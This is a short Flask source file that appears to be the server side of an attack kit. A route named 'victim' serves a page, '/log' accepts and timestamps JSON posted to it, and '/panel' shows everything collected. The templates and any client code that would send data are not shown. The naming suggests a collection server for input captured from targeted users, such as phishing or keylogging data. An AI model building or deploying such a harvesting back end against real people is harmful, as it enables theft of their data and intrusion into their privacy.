from flask import Flask, render_template, request
import datetime

app = Flask(__name__)
logs = []

@app.route('/')
def victim():
    return render_template('index.html')

@app.route('/panel')
def panel():
    return render_template('panel.html', logs=logs)

@app.route('/log', methods=['POST'])
def log():
    content = request.json
    content['time'] = datetime.datetime.now().strftime('%H:%M:%S')
    logs.append(content)
    return 'OK'

if __name__ == '__main__':
    app.run(port=5000)
